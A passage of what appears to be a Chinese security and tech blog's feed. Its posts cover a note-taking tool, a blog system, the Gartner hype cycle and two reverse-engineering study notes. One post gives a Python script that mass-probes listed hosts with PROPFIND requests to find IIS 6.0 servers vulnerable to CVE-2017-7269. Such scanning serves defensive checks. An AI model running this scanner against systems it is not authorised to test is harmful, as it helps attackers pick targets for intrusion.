class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background:PowderBlue"</span>&gt;</span></div><div class="line">	    本文版权：&#123;&#123;siteLink&#125;&#125; &amp;emsp;</div><div class="line">		共享协议：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh'</span> <span class="attr">target</span>=<span class="string">'_blank'</span>&gt;</span>署名-非商业使用-禁止演绎<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h5</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;previousAndNext&#125;&#125;</div><div class="line"></div><div class="line">  &#123;&#123;ad&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">  &#123;&#123;random&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- 来必力City版安装代码 --&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"MTAyMC8yODAwMC80NTc3"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line">			(function(d, s) &#123;</div><div class="line">				var j, e = d.getElementsByTagName(s)[0];</div><div class="line"></div><div class="line">				if (typeof LivereTower === 'function') &#123; return; &#125;</div><div class="line"></div><div class="line">				j = d.createElement(s);</div><div class="line">				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';</div><div class="line">				j.async = true;</div><div class="line"></div><div class="line">				e.parentNode.insertBefore(j, e);</div><div class="line">			&#125;)(document, 'script');</div><div class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">noscript</span>&gt;</span> 为正常使用来必力评论功能请激活JavaScript<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- City版安装代码已完成 --&gt;</span></div><div class="line">  &#123;&#123;contact&#125;&#125;</div><div class="line">  &#123;&#123;bottomCopyright&#125;&#125;</div><div class="line"></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>最后的效果如图<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9adb69d5f.png" alt="snipaste_20170401_201926.png"></p>
</li>
</ol>
<h3 id="最后要说的"><a href="#最后要说的" class="headerlink" title="最后要说的"></a>最后要说的</h3><p>这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大</p>
<p><strong>本文部分转自<a href="http://underwaysoft.com/works/wdtp/download.html" target="_blank" rel="external">Underwaysoft</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：&lt;strong&gt;简洁高效、轻灵优雅、先进强悍、操作简单&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="推荐向" scheme="http://akkuman.coding.me/categories/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
    
      <category term="推荐向" scheme="http://akkuman.coding.me/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iis6-0 cve-2017-7269 批量验证脚本</title>
    <link href="http://akkuman.coding.me/2017/04/01/iis6-0-cve-2017-7269.html"/>
    <id>http://akkuman.coding.me/2017/04/01/iis6-0-cve-2017-7269.html</id>
    <published>2017-04-01T04:44:52.000Z</published>
    <updated>2017-04-01T04:58:00.640Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py" target="_blank" rel="external">代码地址</a></p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">f = open(<span class="string">'ips.txt'</span>, <span class="string">'r'</span>)</div><div class="line">flines = f.readlines()</div><div class="line"></div><div class="line">vulnsrvs = <span class="number">0</span></div><div class="line">i = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> flines:</div><div class="line"></div><div class="line">    host = line.split(<span class="string">":"</span>)</div><div class="line"></div><div class="line">    ip = host[<span class="number">0</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">    port = host[<span class="number">1</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Try ("</span> + str(i) +<span class="string">") "</span>+ str(ip) +<span class="string">":"</span> + str(port)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> port == <span class="string">"443"</span>:</div><div class="line">        <span class="comment">#dont bother with SSL/TLS</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        myout =  subprocess.check_output([<span class="string">'curl'</span>, <span class="string">'--connect-timeout'</span>, <span class="string">'2'</span>, <span class="string">'--max-time'</span>, <span class="string">'2'</span>, <span class="string">'-s'</span>,<span class="string">'-I'</span>, <span class="string">'-X'</span>, <span class="string">'PROPFIND'</span>,<span class="string">'http://'</span> + ip  + <span class="string">':'</span> + port + <span class="string">'/'</span> ])</div><div class="line">        <span class="keyword">print</span> myout</div><div class="line">        <span class="keyword">if</span> <span class="string">"HTTP/1.1 411 Length Required"</span> <span class="keyword">in</span> myout:</div><div class="line">            <span class="keyword">print</span> <span class="string">"Found one:"</span></div><div class="line">            <span class="keyword">print</span> myout</div><div class="line">            vulnsrvs += <span class="number">1</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> str(e.output)</div><div class="line">    i += <span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Vulnerable: "</span> + str(vulnsrvs)</div></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>ips.txt 是待验证的列表格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">129.112.44.1:80</div><div class="line">129.112.44.2:81</div><div class="line">129.112.44.43:8808</div></pre></td></tr></table></figure></p>
<p>它不检测443端口（HTTPS）<br>你也可以简单改一下进行网段批量验证。</p>
<p>转自群友<a href="http://www.loner.fm/article.php?id=24251" target="_blank" rel="external">CF_HB</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py&quot;&gt;代码地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>推荐一个十分好看的开源博客系统</title>
    <link href="http://akkuman.coding.me/2017/03/12/a-beautiful-open-source-blog-lcm.html"/>
    <id>http://akkuman.coding.me/2017/03/12/a-beautiful-open-source-blog-lcm.html</id>
    <published>2017-03-12T12:22:35.000Z</published>
    <updated>2017-03-12T12:25:58.841Z</updated>
    
    <content type="html"><![CDATA[<p>推荐一个十分好看的开源博客系统，直接百度“里程密”地址<a href="http://www.lcm.wang/" target="_blank" rel="external">www.lcm.wang</a></p>
<p>附图</p>
<p>主页</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png" alt="snipaste_20170312_202041.png"></p>
<p>后台</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png" alt="snipaste_20170312_201924.png"></p>
<p>浓浓的科技简约风，适合做技术的你</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;推荐一个十分好看的开源博客系统，直接百度“里程密”地址&lt;a href=&quot;http://www.lcm.wang/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;www.lcm.wang&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;附图&lt;/p&gt;
&lt;p&gt;主页&lt;/p&gt;
&lt;p&gt;&lt;img
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>技术的热门度曲线</title>
    <link href="http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html"/>
    <id>http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html</id>
    <published>2017-03-12T05:34:01.000Z</published>
    <updated>2017-03-12T05:44:27.345Z</updated>
    
    <content type="html"><![CDATA[<p>全球最大的 IT 咨询公司<a href="http://baike.baidu.com/item/Gartner" target="_blank" rel="external">高德纳</a>（Gartner），有一个”<a href="http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp" target="_blank" rel="external">技术热门度曲线</a>“模型（Gartner Hype Cycle）。</p>
<p>该模型认为，一门技术的发展要经历五个阶段。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png" alt="bg2017030301.png"><br><a id="more"></a></p>
<ol>
<li><p><strong>启动期（Innovation Trigger）</strong><br>该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。</p>
</li>
<li><p><strong>泡沫期（Peak of Inflated Expectations）</strong><br>该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。</p>
</li>
<li><p><strong>低谷期（Trough of Disillusionment）</strong><br>该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。</p>
</li>
<li><p><strong>爬升期（Slope of Enlightenment）</strong><br>该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。</p>
</li>
<li><p><strong>高原期（Plateau of Productivity）</strong><br>经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。</p>
</li>
</ol>
<p>该模型的细节可以查看维基百科的<a href="https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png" target="_blank" rel="external">大图</a>。</p>
<p>高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png" alt="bg2017030302.png"></p>
<p>上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。</p>
<p>本周，有人进行数据分析后，建立了一个名叫 <a href="https://stateofdev.com/" target="_blank" rel="external">State.of.Dev</a> 的网站，提供各种技术的热门程度图。</p>
<p>下图是编程语言。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png" alt="bg2017030303.png"></p>
<p>上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。</p>
<p>下图是 Web 技术。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png" alt="bg2017030305.png"></p>
<p>上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。</p>
<p>一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。</p>
<p>用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。</p>
<blockquote>
<p><strong>“争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。”</strong></p>
</blockquote>
<p>简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。</p>
<p>反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。</p>
<p>（完）</p>
<p><strong>转载自<a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html" target="_blank" rel="external">阮一峰的网络日志</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;全球最大的 IT 咨询公司&lt;a href=&quot;http://baike.baidu.com/item/Gartner&quot;&gt;高德纳&lt;/a&gt;（Gartner），有一个”&lt;a href=&quot;http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp&quot;&gt;技术热门度曲线&lt;/a&gt;“模型（Gartner Hype Cycle）。&lt;/p&gt;
&lt;p&gt;该模型认为，一门技术的发展要经历五个阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png&quot; alt=&quot;bg2017030301.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（2）-这是代码还是数据</title>
    <link href="http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html"/>
    <id>http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html</id>
    <published>2017-03-10T15:38:22.000Z</published>
    <updated>2017-03-10T15:56:28.723Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同</strong><br><a id="more"></a></p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmin</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(a&gt;b)</div><div class="line">		<span class="keyword">return</span> b;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    pfunction pGetmin = (pfunction)getmin;</div><div class="line">	</div><div class="line">    c = pGetmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面这段代码是比大小输出小的，<code>typedef int (*pfunction)(int, int);</code>定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> loc[] =</div><div class="line">    &#123;</div><div class="line">        <span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    pfunction getmin = (pfunction)&amp;loc;</div><div class="line">    c = getmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>当<code>c = pGetmin(a, b);</code>调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数<br>getmin函数整体汇编为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">push   ebp</div><div class="line">mov    ebp,esp</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">cmp    eax,DWORD PTR [ebp+0xc]</div><div class="line">jle    &lt;getmin+16&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0xc]</div><div class="line">jmp    &lt;getmin+19&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">pop    ebp</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3</div></pre></td></tr></table></figure></p>
<p>这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果<br>在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码</p>
<p><strong><em>转载请注明出处</em></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（1）-为什么代码不停地循环运行</title>
    <link href="http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html"/>
    <id>http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html</id>
    <published>2017-03-09T08:33:07.000Z</published>
    <updated>2017-03-09T09:45:45.162Z</updated>
    
    <content type="html"><![CDATA[<p>对于下面这段c语言代码会一直不停地循环，为什么呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)</div><div class="line">	&#123;</div><div class="line">		a[i] = <span class="number">0</span>;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">	HelloWorld();</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif" alt="GIF.gif"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png" alt="snipaste_20170309_165830.png"></p>
<p>这个函数主要的汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">8:        int i = 0;</div><div class="line">00401038   mov         dword ptr [ebp-4],0</div><div class="line">9:        int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</div><div class="line">0040103F   mov         dword ptr [ebp-2Ch],1</div><div class="line">00401046   mov         dword ptr [ebp-28h],2</div><div class="line">0040104D   mov         dword ptr [ebp-24h],3</div><div class="line">00401054   mov         dword ptr [ebp-20h],4</div><div class="line">0040105B   mov         dword ptr [ebp-1Ch],5</div><div class="line">00401062   mov         dword ptr [ebp-18h],6</div><div class="line">00401069   mov         dword ptr [ebp-14h],7</div><div class="line">00401070   mov         dword ptr [ebp-10h],8</div><div class="line">00401077   mov         dword ptr [ebp-0Ch],9</div><div class="line">0040107E   mov         dword ptr [ebp-8],0Ah</div><div class="line">10:       for(i=0; i&lt;=10; i++)</div><div class="line">00401085   mov         dword ptr [ebp-4],0</div><div class="line">0040108C   jmp         HelloWorld+77h (00401097)</div><div class="line">0040108E   mov         eax,dword ptr [ebp-4]</div><div class="line">00401091   add         eax,1</div><div class="line">00401094   mov         dword ptr [ebp-4],eax</div><div class="line">00401097   cmp         dword ptr [ebp-4],0Ah</div><div class="line">0040109B   jg          HelloWorld+97h (004010b7)</div><div class="line">11:       &#123;</div><div class="line">12:           a[i] = 0;</div><div class="line">0040109D   mov         ecx,dword ptr [ebp-4]</div><div class="line">004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0</div><div class="line">13:           printf(&quot;Hello World!\n&quot;);</div><div class="line">004010A8   push        offset string &quot;Hello World!\n&quot; (0042301c)</div><div class="line">004010AD   call        printf (004011a0)</div><div class="line">004010B2   add         esp,4</div><div class="line">14:       &#125;</div><div class="line">004010B5   jmp         HelloWorld+6Eh (0040108e)</div><div class="line">15:   &#125;</div></pre></td></tr></table></figure></p>
<p>从<code>int i = 0;</code>开始看直到<code>for(i=0; i&lt;=10; i++)</code>的堆栈图是</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png" alt="snipaste_20170309_170508.png"></p>
<p>第一次进入循环开始先把0放到了[ebp-4]，然后跳到了<code>00401097   cmp dword ptr [ebp-4],0Ah</code>以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行<code>jg HelloWorld+97h (004010b7)</code>跳到004010b7函数结束<br>第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行<code>0040109D</code>处的语句，此时<code>ECX</code>中的值变成了[ebp-4]中的值也就是0，然后<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>将0放到<code>ebp+ecx*4-2Ch</code>处也就是<code>EBP-2C</code>处，下面的两条语句不用管是执行输出的，然后到了<code>add  esp,4</code>将栈顶的值加4，这里我们无需关注栈顶，然后<code>jmp HelloWorld+6Eh (0040108e)</code>跳回到<code>0040108e</code>继续执行</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png" alt="snipaste_20170309_170508.png"></p>
<p>跳到<code>0040108E   mov  eax,dword ptr [ebp-4]</code>开始执行，紧接着这三条语句的作用是把<code>EBP-4</code>中的值加了1，也就是<code>EBP-4</code>中的值现在为1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax,dword ptr [ebp-4]</div><div class="line">add eax,1</div><div class="line">mov dword ptr [ebp-4],eax</div></pre></td></tr></table></figure></p>
<p>cmp比较之后再次执行循环体，循环体完成后再次跳到<code>0040108e</code>，此时<code>EBP-28</code>的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png" alt="snipaste_20170309_172648.png"></p>
<p>紧接着下次执行后</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png" alt="snipaste_20170309_172805.png"></p>
<p>直到这个数组长度为10的数组执行到第十次</p>
